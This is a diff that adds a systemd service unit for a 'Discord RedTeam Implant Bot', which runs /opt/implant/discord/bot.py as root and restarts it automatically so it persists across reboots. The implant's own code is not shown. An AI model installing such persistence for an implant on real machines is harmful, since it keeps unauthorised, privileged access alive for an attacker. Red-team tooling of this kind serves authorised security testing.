@@ -1,0 +1,14 @@
+[Unit]
+Description=Discord RedTeam Implant Bot
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+WorkingDirectory=/opt/implant/discord
+ExecStart=/opt/implant/discord/venv/bin/python3 /opt/implant/discord/bot.py
+Restart=always
+RestartSec=5
+User=root
+
+[Install]
+WantedBy=multi-user.target
